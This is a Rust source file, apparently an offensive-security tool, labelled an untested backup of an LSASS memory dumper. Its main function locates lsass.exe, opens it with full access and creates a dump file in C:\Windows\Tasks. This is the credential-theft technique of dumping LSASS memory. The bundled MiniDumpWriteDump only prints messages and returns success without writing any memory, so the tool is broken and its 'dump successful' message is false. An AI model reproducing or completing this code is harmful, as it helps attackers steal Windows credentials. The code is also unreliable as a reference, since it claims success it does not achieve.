/*
    This code is not tested. Just making it as backup. Will be in the Production.
    Sorry for the unproductive Nerds ;( . will be fixexd soon . Just commiting here for backup 

    Lsass dump 
    @5mukx
*/


use std::mem;
use std::ptr::null_mut;
use winapi::um::fileapi::{CreateFileA, CREATE_ALWAYS};
use winapi::um::handleapi::CloseHandle;
use winapi::um::processthreadsapi::OpenProcess;
use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::winnt::{FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE, PROCESS_ALL_ACCESS};
use std::ffi::CString;
use winapi::ctypes::c_void;


macro_rules! okey {
    ($msg:expr, $($arg:expr), *) => {
        println!("[+] {}", format!($msg, $($arg),*));
    }
}
macro_rules! error {
    ($msg:expr, $($arg:expr), *) => {
        println!("[!] {}", format!($msg,$($arg),*));
    };
}

fn get_pid(process_name: &str) -> u32{
    unsafe{
        let mut pe: PROCESSENTRY32 = std::mem::zeroed();
        pe.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;

        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap.is_null(){
            error!("Error while snapshoting processes : Error : {:?}", GetLastError());
            std::process::exit(0);
        }

        let mut pid = 0;

        let mut result = Process32First(snap, &mut pe) != 0;

        while result{

            let exe_file = CString::from_vec_unchecked(pe.szExeFile
                .iter()
                .map(|&file| file as u8)
                .take_while(|&c| c!=0)
                .collect::<Vec<u8>>(),
            );

            if exe_file.to_str().unwrap() == process_name {
                pid = pe.th32ProcessID;
                break;
            }
            result = Process32Next(snap, &mut pe) !=0;
        }

        if pid == 0{
            error!("Unable to get PID for {}: {}",process_name , "PROCESS DOESNT EXISTS");           
            std::process::exit(0);
        }
    
        CloseHandle(snap);
        pid
    }
}


fn main(){
    unsafe{
        let lsass_pid = get_pid("lsass.exe");

        okey!("PID of lsass: {}", lsass_pid);

        
        let hprocess = OpenProcess(
            PROCESS_ALL_ACCESS,
            0, 
            lsass_pid
        );

        if hprocess.is_null(){
            error!("Unable to OpenProcess the PID {}, Error: {}",lsass_pid, GetLastError());
            std::process::exit(0);
        }

        okey!("HANDLE for lsass: {:?}", hprocess);

        let path = CString::new("C:\\Windows\\Tasks\\lsass.dmp").expect("Error While converting into CString");

        let hfile = CreateFileA(
        path.as_ptr(), 
        FILE_GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        null_mut(), 
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        null_mut(),
        );

        if hfile.is_null(){
            error!("CreateFileA Failed with Error: {:?}", hfile);
            std::process::exit(0);
        }

        
        MiniDumpWriteDump(
            hprocess,
            lsass_pid,
            hfile,
            MiniDumpWithFullMemory,
            None, 
            None, 
            None
        
        ).unwrap_or_else(|e| {
            error!("MiniDumpWriteDump Failed with Error : {}",e);
            std::process::exit(0);
        });

        println!("lsass dump successfull !");
    }
}

#[allow(unused_variables)]
#[allow(non_upper_case_globals)]
pub const MiniDumpWithFullMemory: MINIDUMP_TYPE = MINIDUMP_TYPE(0x00000002);

#[allow(non_snake_case)]
pub unsafe fn MiniDumpWriteDump<P0, P1>(
    hprocess: P0,
    processid: u32,
    hfile: P1,
    dumptype: MINIDUMP_TYPE,
    exceptionparam: Option<*const MINIDUMP_EXCEPTION_INFORMATION>,
    userstreamparam: Option<*const MINIDUMP_USER_STREAM_INFORMATION>,
    callbackparam: Option<*const MINIDUMP_CALLBACK_INFORMATION>
) -> Result<(), String>
where
    P0: Into<HANDLE>,
    P1: Into<HANDLE>,
{
    let hprocess = hprocess.into();
    let hfile = hfile.into();
    
    if hprocess == null_mut() || hfile == null_mut() {
        return Err("Invalid handle".to_string());
    }
    
    // Simulate writing the dump file
    println!("Writing minidump for process ID: {}", processid);
    println!("Dump type: {:?}", dumptype);

    #[allow(unused_variables)]
    if let Some(exception_info) = exceptionparam {
        println!("Exception info provided");
    }
    #[allow(unused_variables)]
    if let Some(user_stream_info) = userstreamparam {
        println!("User stream info provided");
    }
    #[allow(unused_variables)]
    if let Some(callback_info) = callbackparam {
        println!("Callback info provided");
    }

    Ok(())

}
// Custom implementation of the MiniDumpWriteDump
use winapi::shared::ntdef::HANDLE;

use winapi::um::winnt::EXCEPTION_POINTERS;
use winapi::shared::minwindef::BOOL;

#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(transparent)]
#[derive(Debug)]
pub struct MINIDUMP_TYPE(pub i32);

#[repr(C, packed(4))]
#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
pub struct MINIDUMP_EXCEPTION_INFORMATION {
    pub ThreadId: u32,
    pub ExceptionPointers: *mut EXCEPTION_POINTERS,
    pub ClientPointers: BOOL,
}

#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C, packed(4))]
pub struct MINIDUMP_USER_STREAM {
    pub Type: u32,
    pub BufferSize: u32,
    pub Buffer: *mut c_void,
}

#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C, packed(4))]
pub struct MINIDUMP_USER_STREAM_INFORMATION {
    pub UserStreamCount: u32,
    pub UserStreamArray: *mut MINIDUMP_USER_STREAM,
}

#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C, packed(4))]
pub struct MINIDUMP_CALLBACK_INPUT {
    pub ProcessId: u32,
    pub ProcessHandle: HANDLE,
    pub CallbackType: u32,
    pub Anonymous: MINIDUMP_CALLBACK_INPUT_0,
}


#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C, packed(4))]
pub struct MINIDUMP_CALLBACK_OUTPUT {
    pub Anonymous: MINIDUMP_CALLBACK_OUTPUT_0,
}

// MINIDUMP CALL_BACK_INPUT_0 PROCESS STRUCT CREATION
use winapi::um::winnt::CONTEXT;

#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C, packed(4))]
pub struct MINIDUMP_THREAD_CALLBACK {
    pub ThreadId: u32,
    pub ThreadHandle: HANDLE,
    pub Context: CONTEXT,
    pub SizeOfContext: u32,
    pub StackBase: u64,
    pub StackEnd: u64,
}

#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C, packed(4))]
pub struct MINIDUMP_THREAD_EX_CALLBACK {
    pub ThreadId: u32,
    pub ThreadHandle: HANDLE,
    pub Context: CONTEXT,
    pub SizeOfContext: u32,
    pub StackBase: u64,
    pub StackEnd: u64,
    pub BackingStoreBase: u64,
    pub BackingStoreEnd: u64,
}

use winapi::shared::ntdef::PWSTR;

// VS_FIXEDFILEINFO

#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(transparent)]
pub struct VS_FIXEDFILEINFO_FILE_FLAGS(pub u32);

#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(transparent)]
pub struct VS_FIXEDFILEINFO_FILE_OS(pub u32);

#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C)]

pub struct VS_FIXEDFILEINFO {

    pub dwSignature: u32,
    pub dwStrucVersion: u32,
    pub dwFileVersionMS: u32,
    pub dwFileVersionLS: u32,
    pub dwProductVersionMS: u32,
    pub dwProductVersionLS: u32,
    pub dwFileFlagsMask: u32,
    pub dwFileFlags: VS_FIXEDFILEINFO_FILE_FLAGS,
    pub dwFileOS: VS_FIXEDFILEINFO_FILE_OS,
    pub dwFileType: u32,
    pub dwFileSubtype: u32,
    pub dwFileDateMS: u32,
    pub dwFileDateLS: u32,
}

#[repr(C, packed(4))]
#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
pub struct MINIDUMP_MODULE_CALLBACK {
    pub FullPath: PWSTR,
    pub BaseOfImage: u64,
    pub SizeOfImage: u32,
    pub CheckSum: u32,
    pub TimeDateStamp: u32,
    pub VersionInfo: VS_FIXEDFILEINFO,
    pub CvRecord: *mut c_void,
    pub SizeOfCvRecord: u32,
    pub MiscRecord: *mut c_void,
    pub SizeOfMiscRecord: u32,
}


#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C, packed(4))]
pub struct MINIDUMP_INCLUDE_THREAD_CALLBACK {
    pub ThreadId: u32,
}

#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C, packed(4))]
pub struct MINIDUMP_INCLUDE_MODULE_CALLBACK {
    pub BaseOfImage: u64,
}

#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C, packed(4))]
pub struct MINIDUMP_IO_CALLBACK {
    pub Handle: HANDLE,
    pub Offset: u64,
    pub Buffer: *mut c_void,
    pub BufferBytes: u32,
}

use winapi::shared::ntdef::HRESULT;

#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C, packed(4))]
pub struct MINIDUMP_READ_MEMORY_FAILURE_CALLBACK {
    pub Offset: u64,
    pub Bytes: u32,
    pub FailureStatus: HRESULT,
}

#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C, packed(4))]
pub struct MINIDUMP_VM_QUERY_CALLBACK {
    pub Offset: u64,
}

#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C, packed(4))]
pub struct MINIDUMP_VM_PRE_READ_CALLBACK {
    pub Offset: u64,
    pub Buffer: *mut c_void,
    pub Size: u32,
}

#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C, packed(4))]
pub struct MINIDUMP_VM_POST_READ_CALLBACK {
    pub Offset: u64,
    pub Buffer: *mut c_void,
    pub Size: u32,
    pub Completed: u32,
    pub Status: HRESULT,
}


#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C)]
pub union MINIDUMP_CALLBACK_INPUT_0 {
    pub Status: HRESULT,
    pub Thread:  std::mem::ManuallyDrop<MINIDUMP_THREAD_CALLBACK>,
    pub ThreadEx: std::mem::ManuallyDrop<MINIDUMP_THREAD_EX_CALLBACK>,
    pub Module: std::mem::ManuallyDrop<MINIDUMP_MODULE_CALLBACK>,
    pub IncludeThread: std::mem::ManuallyDrop<MINIDUMP_INCLUDE_THREAD_CALLBACK>,
    pub IncludeModule: std::mem::ManuallyDrop<MINIDUMP_INCLUDE_MODULE_CALLBACK>,
    pub Io: std::mem::ManuallyDrop<MINIDUMP_IO_CALLBACK>,
    pub ReadMemoryFailure: std::mem::ManuallyDrop<MINIDUMP_READ_MEMORY_FAILURE_CALLBACK>,
    pub SecondaryFlags: u32,
    pub VmQuery: std::mem::ManuallyDrop<MINIDUMP_VM_QUERY_CALLBACK>,
    pub VmPreRead: std::mem::ManuallyDrop<MINIDUMP_VM_PRE_READ_CALLBACK>,
    pub VmPostRead: std::mem::ManuallyDrop<MINIDUMP_VM_POST_READ_CALLBACK>,
}

// MINIDUMP CALLBACK OUTPUTS 
#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(transparent)]
pub struct VIRTUAL_ALLOCATION_TYPE(pub u32);

#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C, packed(4))]
pub struct MINIDUMP_MEMORY_INFO {
    pub BaseAddress: u64,
    pub AllocationBase: u64,
    pub AllocationProtect: u32,
    pub __alignment1: u32,
    pub RegionSize: u64,
    pub State: VIRTUAL_ALLOCATION_TYPE,
    pub Protect: u32,
    pub Type: u32,
    pub __alignment2: u32,
}

#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C, packed(4))]
pub struct MINIDUMP_CALLBACK_OUTPUT_0_0 {
    pub MemoryBase: u64,
    pub MemorySize: u32,
}
#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C)]
pub struct MINIDUMP_CALLBACK_OUTPUT_0_1 {
    pub CheckCancel: BOOL,
    pub Cancel: BOOL,
}

#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C)]
pub struct MINIDUMP_CALLBACK_OUTPUT_0_2 {
    pub VmRegion: MINIDUMP_MEMORY_INFO,
    pub Continue: BOOL,
}

#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C)]
pub struct MINIDUMP_CALLBACK_OUTPUT_0_3 {
    pub VmQueryStatus: HRESULT,
    pub VmQueryResult: MINIDUMP_MEMORY_INFO,
}

#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C)]
pub struct MINIDUMP_CALLBACK_OUTPUT_0_4 {
    pub VmReadStatus: HRESULT,
    pub VmReadBytesCompleted: u32,
}

#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C)]
pub union MINIDUMP_CALLBACK_OUTPUT_0 {
    pub ModuleWriteFlags: u32,
    pub ThreadWriteFlags: u32,
    pub SecondaryFlags: u32,
    pub Anonymous1: std::mem::ManuallyDrop<MINIDUMP_CALLBACK_OUTPUT_0_0>,
    pub Anonymous2: std::mem::ManuallyDrop<MINIDUMP_CALLBACK_OUTPUT_0_1>,
    pub Handle: HANDLE,
    pub Anonymous3: std::mem::ManuallyDrop<MINIDUMP_CALLBACK_OUTPUT_0_2>,
    pub Anonymous4: std::mem::ManuallyDrop<MINIDUMP_CALLBACK_OUTPUT_0_3>,
    pub Anonymous5: std::mem::ManuallyDrop<MINIDUMP_CALLBACK_OUTPUT_0_4>,
    pub Status: HRESULT,
}

#[allow(non_camel_case_types)]
pub type MINIDUMP_CALLBACK_ROUTINE = Option<unsafe extern "system" fn(callbackparam: *mut c_void, callbackinput: *const MINIDUMP_CALLBACK_INPUT, callbackoutput: *mut MINIDUMP_CALLBACK_OUTPUT) -> BOOL>;

#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C, packed(4))]
pub struct MINIDUMP_CALLBACK_INFORMATION {
    pub CallbackRoutine: MINIDUMP_CALLBACK_ROUTINE,
    pub CallbackParam: *mut c_void,
}


